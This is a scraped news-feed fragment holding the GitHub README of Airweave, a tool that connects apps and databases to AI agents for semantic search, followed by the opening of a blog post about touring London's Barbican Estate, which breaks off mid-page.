<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/29870230/406658750-e79a9af7-2e93-4888-9cf4-0f700f19fe05.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDcwOTI5MDIsIm5iZiI6MTc0NzA5MjYwMiwicGF0aCI6Ii8yOTg3MDIzMC80MDY2NTg3NTAtZTc5YTlhZjctMmU5My00ODg4LTljZjQtMGY3MDBmMTlmZTA1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA1MTIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNTEyVDIzMzAwMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThmMTYzMDhkMzNjMzM2NWIxZTdjYWFhNDc4ZWVmY2VkYmNjYjZjZjFkM2Y5YmRhODM5OGI1MzlkNTU4NTliNjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3M7cQsSl0yc1znr57lKhuKKPG7fyRO6A5hDTn5L7c8w"><img width="1673" alt="airweave-lettermark" src="https://private-user-images.githubusercontent.com/29870230/406658750-e79a9af7-2e93-4888-9cf4-0f700f19fe05.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDcwOTI5MDIsIm5iZiI6MTc0NzA5MjYwMiwicGF0aCI6Ii8yOTg3MDIzMC80MDY2NTg3NTAtZTc5YTlhZjctMmU5My00ODg4LTljZjQtMGY3MDBmMTlmZTA1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA1MTIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNTEyVDIzMzAwMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThmMTYzMDhkMzNjMzM2NWIxZTdjYWFhNDc4ZWVmY2VkYmNjYjZjZjFkM2Y5YmRhODM5OGI1MzlkNTU4NTliNjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3M7cQsSl0yc1znr57lKhuKKPG7fyRO6A5hDTn5L7c8w"></a>
<p dir="auto"><a href="https://github.com/airweave-ai/airweave/actions/workflows/ruff.yml"><img src="https://github.com/airweave-ai/airweave/actions/workflows/ruff.yml/badge.svg" alt="Ruff"></a>
<a href="https://github.com/airweave-ai/airweave/actions/workflows/eslint.yml"><img src="https://github.com/airweave-ai/airweave/actions/workflows/eslint.yml/badge.svg" alt="ESLint"></a>
<a href="https://github.com/airweave-ai/airweave/actions/workflows/tests.yml"><img src="https://github.com/airweave-ai/airweave/actions/workflows/tests.yml/badge.svg?branch=main" alt="Backend Tests"></a>
<a href="https://codecov.io/gh/airweave-ai/airweave" rel="nofollow"><img src="https://camo.githubusercontent.com/72dc032ef803670b16c9e810871ff98059aa93128e291e419011fdb3adf34e14/68747470733a2f2f636f6465636f762e696f2f67682f61697277656176652d61692f61697277656176652f6272616e63682f6d61696e2f67726170682f62616467652e737667" alt="Codecov" data-canonical-src="https://codecov.io/gh/airweave-ai/airweave/branch/main/graph/badge.svg"></a>
<a href="https://discord.com/invite/484HY9Ehxt" rel="nofollow"><img src="https://camo.githubusercontent.com/e4046f9afb96d1c8102810499c7629eb3ba142fac5b2bb6a8855d1bc1eaba829/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f313332333431353038353031313730313837303f6c6162656c3d446973636f7264266c6f676f3d646973636f7264266c6f676f436f6c6f723d7768697465267374796c653d666c61742d737175617265" alt="Discord" data-canonical-src="https://img.shields.io/discord/1323415085011701870?label=Discord&amp;logo=discord&amp;logoColor=white&amp;style=flat-square"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Airweave</h2><a id="user-content-airweave" aria-label="Permalink: Airweave" href="#airweave"></a></p>
<p dir="auto"><strong>Airweave is a tool that lets agents semantically search any app.</strong> It's MCP compatible and seamlessly connects any app, database, or API, to transform their contents into agent-ready knowledge.</p>
<div dir="auto">
<p dir="auto"><h3 tabindex="-1" dir="auto">🎥 Watch Demo</h3><a id="user-content--watch-demo" aria-label="Permalink: 🎥 Watch Demo" href="#-watch-demo"></a></p>
<details open="">
  <summary>
    
    <span aria-label="Video description airweave_launch_bf_demo_vid_inverted_4k.mp4">airweave_launch_bf_demo_vid_inverted_4k.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/25402511/436792468-abdf85cb-a8f5-4b6c-b5a3-d4b5177e6bda.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDcwOTI5MDIsIm5iZiI6MTc0NzA5MjYwMiwicGF0aCI6Ii8yNTQwMjUxMS80MzY3OTI0NjgtYWJkZjg1Y2ItYThmNS00YjZjLWI1YTMtZDRiNTE3N2U2YmRhLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA1MTIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNTEyVDIzMzAwMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRhMTc0MTlhNmQ3YzQ2ZGY4ZGY0NGY0MDQ3ODJhYmYwMzQ5YTMzZjFjNjA4OTc0ZTcyNThiZDU3OTBmZTBjODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.EZuXVWeVdnz7MA76JazXBTnPYEYROyHYhwfrre5MQ_8" data-canonical-src="https://private-user-images.githubusercontent.com/25402511/436792468-abdf85cb-a8f5-4b6c-b5a3-d4b5177e6bda.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDcwOTI5MDIsIm5iZiI6MTc0NzA5MjYwMiwicGF0aCI6Ii8yNTQwMjUxMS80MzY3OTI0NjgtYWJkZjg1Y2ItYThmNS00YjZjLWI1YTMtZDRiNTE3N2U2YmRhLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA1MTIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNTEyVDIzMzAwMlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRhMTc0MTlhNmQ3YzQ2ZGY4ZGY0NGY0MDQ3ODJhYmYwMzQ5YTMzZjFjNjA4OTc0ZTcyNThiZDU3OTBmZTBjODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.EZuXVWeVdnz7MA76JazXBTnPYEYROyHYhwfrre5MQ_8" controls="controls" muted="muted">

  </video>
</details>

</div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Overview</h2><a id="user-content-overview" aria-label="Permalink: Overview" href="#overview"></a></p>
<p dir="auto">Airweave simplifies the process of making information retrievable for your agent. Whether you have structured or unstructured data, Airweave helps you break it into processable entities, store the data and make it retrievable through REST and MCP endpoints.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#airweave">Airweave</a>
<ul dir="auto">
<li><a href="#-watch-demo">🎥 Watch Demo</a></li>
<li><a href="#overview">Overview</a></li>
<li><a href="#table-of-contents">Table of Contents</a></li>
<li><a href="#-quick-start">🚀 Quick Start</a></li>
<li><a href="#-supported-integrations">🔌 Supported Integrations</a></li>
<li><a href="#-usage">💻 Usage</a>
<ul dir="auto">
<li><a href="#frontend">Frontend</a></li>
<li><a href="#api">API</a></li>
</ul>
</li>
<li><a href="#-sdks">📦 SDKs</a>
<ul dir="auto">
<li><a href="#python">Python</a></li>
<li><a href="#typescriptjavascript">TypeScript/JavaScript</a></li>
</ul>
</li>
<li><a href="#-key-features">🔑 Key Features</a></li>
<li><a href="#-technology-stack">🔧 Technology Stack</a></li>
<li><a href="#%EF%B8%8F-roadmap">🛣️ Roadmap</a></li>
<li><a href="#-contributing">👥 Contributing</a></li>
<li><a href="#-license">📄 License</a></li>
<li><a href="#-connect">🔗 Connect</a></li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Quick Start</h2><a id="user-content--quick-start" aria-label="Permalink: 🚀 Quick Start" href="#-quick-start"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="# 1. Clone the repository
git clone https://github.com/airweave-ai/airweave.git
cd airweave

# 2. Build and run
chmod +x start.sh
./start.sh"><pre><span><span>#</span> 1. Clone the repository</span>
git clone https://github.com/airweave-ai/airweave.git
<span>cd</span> airweave

<span><span>#</span> 2. Build and run</span>
chmod +x start.sh
./start.sh</pre></div>
<p dir="auto">That's it! Access the dashboard at <a href="http://localhost:8080/" rel="nofollow">http://localhost:8080</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔌 Supported Integrations</h2><a id="user-content--supported-integrations" aria-label="Permalink: 🔌 Supported Integrations" href="#-supported-integrations"></a></p>

<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/asana.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/asana.svg" alt="Asana" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/calendly.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/calendly.svg" alt="Calendly" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/chat-gpt.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/chat-gpt.svg" alt="Chat-gpt" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/clickup.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/clickup.svg" alt="Clickup" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/confluence.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/confluence.svg" alt="Confluence" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/dropbox.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/dropbox.svg" alt="Dropbox" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/facebook.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/facebook.svg" alt="Facebook" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/github.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/github.svg" alt="Github" width="40" height="40"></a>
    <a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/gmail.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/gmail.svg" alt="Gmail" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/google_calendar.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/google_calendar.svg" alt="Google Calendar" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/google_drive.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/google_drive.svg" alt="Google Drive" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/hubspot.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/hubspot.svg" alt="Hubspot" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/intercom.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/intercom.svg" alt="Intercom" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/jira.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/jira.svg" alt="Jira" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/linear.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/linear.svg" alt="Linear" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/linkedin.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/linkedin.svg" alt="Linkedin" width="40" height="40"></a>
    <a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/mailchimp.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/mailchimp.svg" alt="Mailchimp" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/monday.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/monday.svg" alt="Monday" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/mysql.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/mysql.svg" alt="Mysql" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/notion.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/notion.svg" alt="Notion" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/onedrive.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/onedrive.svg" alt="Onedrive" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/oracle.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/oracle.svg" alt="Oracle" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/outlook_calendar.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/outlook_calendar.svg" alt="Outlook Calendar" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/outlook_mail.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/outlook_mail.svg" alt="Outlook Mail" width="40" height="40"></a>
    <a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/perplexity.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/perplexity.svg" alt="Perplexity" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/postgresql.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/postgresql.svg" alt="Postgresql" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/salesforce.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/salesforce.svg" alt="Salesforce" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/slack.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/slack.svg" alt="Slack" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/sql_server.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/sql_server.svg" alt="Sql Server" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/sqlite.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/sqlite.svg" alt="Sqlite" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/stripe.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/stripe.svg" alt="Stripe" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/todoist.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/todoist.svg" alt="Todoist" width="40" height="40"></a>
    <span></span><span></span><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/trello.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/trello.svg" alt="Trello" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/whatsapp.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/whatsapp.svg" alt="Whatsapp" width="40" height="40"></a><a target="_blank" rel="noopener noreferrer" href="https://github.com/airweave-ai/airweave/blob/main/frontend/src/components/icons/apps/zendesk.svg"><img src="https://github.com/airweave-ai/airweave/raw/main/frontend/src/components/icons/apps/zendesk.svg" alt="Zendesk" width="40" height="40"></a>
  </p>


<p dir="auto"><h2 tabindex="-1" dir="auto">💻 Usage</h2><a id="user-content--usage" aria-label="Permalink: 💻 Usage" href="#-usage"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Frontend</h3><a id="user-content-frontend" aria-label="Permalink: Frontend" href="#frontend"></a></p>
<ul dir="auto">
<li>Access the UI at <code>http://localhost:8080</code></li>
<li>Connect sources, configure syncs, and query data</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">API</h3><a id="user-content-api" aria-label="Permalink: API" href="#api"></a></p>
<ul dir="auto">
<li>Swagger docs: <code>http://localhost:8001/docs</code></li>
<li>Create connections, trigger syncs, and search data</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">📦 SDKs</h2><a id="user-content--sdks" aria-label="Permalink: 📦 SDKs" href="#-sdks"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Python</h3><a id="user-content-python" aria-label="Permalink: Python" href="#python"></a></p>

<div dir="auto" data-snippet-clipboard-copy-content="from airweave import AirweaveClient

client = AirweaveClient(api_key=&quot;your-api-key&quot;)

# List all sources
sources = client.sources.list()

# Create a sync job
job = client.sync.create_sync(
  name=&quot;My first sync&quot;,
  source_connection_id=source_id,
  run_immediately=True
)"><pre><span>from</span> <span>airweave</span> <span>import</span> <span>AirweaveClient</span>

<span>client</span> <span>=</span> <span>AirweaveClient</span>(<span>api_key</span><span>=</span><span>"your-api-key"</span>)

<span># List all sources</span>
<span>sources</span> <span>=</span> <span>client</span>.<span>sources</span>.<span>list</span>()

<span># Create a sync job</span>
<span>job</span> <span>=</span> <span>client</span>.<span>sync</span>.<span>create_sync</span>(
  <span>name</span><span>=</span><span>"My first sync"</span>,
  <span>source_connection_id</span><span>=</span><span>source_id</span>,
  <span>run_immediately</span><span>=</span><span>True</span>
)</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">TypeScript/JavaScript</h3><a id="user-content-typescriptjavascript" aria-label="Permalink: TypeScript/JavaScript" href="#typescriptjavascript"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="npm install @airweave/sdk
# or
yarn add @airweave/sdk"><pre>npm install @airweave/sdk
<span><span>#</span> or</span>
yarn add @airweave/sdk</pre></div>
<div dir="auto" data-snippet-clipboard-copy-content="import { AirweaveClient } from &quot;@airweave/sdk&quot;;

const client = new AirweaveClient({
  apiKey: &quot;your-api-key&quot;,
});

// List sources
const sources = await client.sources.list();

// Create a sync job
const job = await client.sync.create_sync({
  name: &quot;My first sync&quot;,
  source_connection_id: sourceId,
  run_immediately: true,
});"><pre><span>import</span> <span>{</span> <span>AirweaveClient</span> <span>}</span> <span>from</span> <span>"@airweave/sdk"</span><span>;</span>

<span>const</span> <span>client</span> <span>=</span> <span>new</span> <span>AirweaveClient</span><span>(</span><span>{</span>
  <span>apiKey</span>: <span>"your-api-key"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>// List sources</span>
<span>const</span> <span>sources</span> <span>=</span> <span>await</span> <span>client</span><span>.</span><span>sources</span><span>.</span><span>list</span><span>(</span><span>)</span><span>;</span>

<span>// Create a sync job</span>
<span>const</span> <span>job</span> <span>=</span> <span>await</span> <span>client</span><span>.</span><span>sync</span><span>.</span><span>create_sync</span><span>(</span><span>{</span>
  <span>name</span>: <span>"My first sync"</span><span>,</span>
  <span>source_connection_id</span>: <span>sourceId</span><span>,</span>
  <span>run_immediately</span>: <span>true</span><span>,</span>
<span>}</span><span>)</span><span>;</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔑 Key Features</h2><a id="user-content--key-features" aria-label="Permalink: 🔑 Key Features" href="#-key-features"></a></p>
<ul dir="auto">
<li><strong>Data synchronization</strong> from 25+ sources with minimal config</li>
<li><strong>Entity extraction</strong> and transformation pipeline</li>
<li><strong>Multi-tenant</strong> architecture with OAuth2</li>
<li><strong>Incremental updates</strong> using content hashing</li>
<li><strong>Semantic search</strong> for agent queries</li>
<li><strong>Versioning</strong> for data changes</li>
<li><strong>White-labeling</strong> support for SaaS builders</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔧 Technology Stack</h2><a id="user-content--technology-stack" aria-label="Permalink: 🔧 Technology Stack" href="#-technology-stack"></a></p>
<ul dir="auto">
<li><strong>Frontend</strong>: React/TypeScript with ShadCN</li>
<li><strong>Backend</strong>: FastAPI (Python)</li>
<li><strong>Databases</strong>: PostgreSQL (metadata), Qdrant (vectors)</li>
<li><strong>Deployment</strong>: Docker Compose (dev), Kubernetes (prod)</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🛣️ Roadmap</h2><a id="user-content-️-roadmap" aria-label="Permalink: 🛣️ Roadmap" href="#️-roadmap"></a></p>
<ul dir="auto">
<li>Additional source integrations</li>
<li>Redis worker queues for large-scale syncs</li>
<li>Webhooks for event-driven syncs</li>
<li>Kubernetes support via Helm charts</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">👥 Contributing</h2><a id="user-content--contributing" aria-label="Permalink: 👥 Contributing" href="#-contributing"></a></p>
<p dir="auto">We welcome contributions! Please check <a href="https://github.com/airweave-ai/airweave/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for details.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">📄 License</h2><a id="user-content--license" aria-label="Permalink: 📄 License" href="#-license"></a></p>
<p dir="auto">Airweave is released under the <a href="https://github.com/airweave-ai/airweave/blob/main/LICENSE">MIT</a> license.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔗 Connect</h2><a id="user-content--connect" aria-label="Permalink: 🔗 Connect" href="#-connect"></a></p>
<ul dir="auto">
<li><strong><a href="https://discord.com/invite/484HY9Ehxt" rel="nofollow">Discord</a></strong> - Get help and discuss features</li>
<li><strong><a href="https://github.com/airweave-ai/airweave/issues">GitHub Issues</a></strong> - Report bugs or request features</li>
<li><strong><a href="https://x.com/airweave_ai" rel="nofollow">Twitter</a></strong> - Follow for updates</li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Barbican (374 pts)]]></title>
            <link>https://arslan.io/2025/05/12/barbican-estate/</link>
            <guid>43964136</guid>
            <pubDate>Mon, 12 May 2025 15:28:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arslan.io/2025/05/12/barbican-estate/">https://arslan.io/2025/05/12/barbican-estate/</a>, See on <a href="https://news.ycombinator.com/item?id=43964136">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
<main>

        <article>

        

    <div>
        <p>Three years ago, while searching for Vitsoe setups, I stumbled upon <a href="https://en.wikipedia.org/wiki/Barbican_Estate?ref=arslan.io" rel="noreferrer">Barbican</a>. I delved deeper and discovered a building complex that that was beyond my imaginations.</p><figure><img src="https://arslan.io/content/images/2025/05/L1008089-1.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008089-1.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008089-1.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008089-1.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008089-1.jpeg 2000w" sizes="(min-width: 1200px) 1200px"></figure><p>Young Fatih would definitely find it ugly; current me finds it beautiful. The estate was built between 1965 and 1976. And, since I first saw it, I started watching and reading everything I could find. There are a few YouTube videos where you can peek into the lives of the residents. And there are a few books as well.</p><figure><img src="https://arslan.io/content/images/2025/05/L1008049.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008049.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008049.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008049.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008049.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><p>Of course, my dream was to visit the actual place. Stay there for a few hours, and discover more about this grandiose place. When I had a chance to visit London a few weeks ago, I planned to visit the estate. I had to.</p><figure><img src="https://arslan.io/content/images/2025/05/L1007868.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007868.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007868.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007868.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007868.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><p>While researching, I discovered that Barbican was far more than I had imagined. The residents offered <a href="https://www.barbican.org.uk/whats-on/2025/event/architecture-tours?ref=arslan.io" rel="noreferrer">architecture tours</a>, and I couldn’t resist the opportunity to attend one. I invited two friends along, and we embarked on a 2-hour-long tour.</p><figure><img src="https://arslan.io/content/images/2025/05/L1007993.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1007993.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1007993.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1007993.jpeg 1600w, https://arslan.io/content/images/2025/05/L1007993.jpeg 2000w" sizes="(min-width: 720px) 720px"></figure><p>The tour, which took almost two hours, felt like it was just 10 minutes long. Our tour guide informed us with hundreds of small details, a few of which stuck in my mind in no particular order. Here are some of them (nit: all the photos where shoot with the Leica M11 + 35mm Summilux FLE) </p><ul><li>Someone could start living as a single, marry someone, have kids, the kids could move out, the residents could die all in the same place. It has all the amenities someone would need to live there.</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1008006.jpeg" alt="" loading="lazy" width="2000" height="1329" srcset="https://arslan.io/content/images/size/w600/2025/05/L1008006.jpeg 600w, https://arslan.io/content/images/size/w1000/2025/05/L1008006.jpeg 1000w, https://arslan.io/content/images/size/w1600/2025/05/L1008006.jpeg 1600w, https://arslan.io/content/images/2025/05/L1008006.jpeg 2000w" sizes="(min-width: 1200px) 1200px"></figure><ul><li>It's by design, created like a maze so people get lost. The tour guide even made a joke that there were no thieves in the Barbican, because once in, they don't know how to get out. (nit: <em>our Tour Guide said a few times how he felt like he lives in a Prison where volunteers would pay to live there</em>)</li></ul><figure><img src="https://arslan.io/content/images/2025/05/L1007985.jpeg" 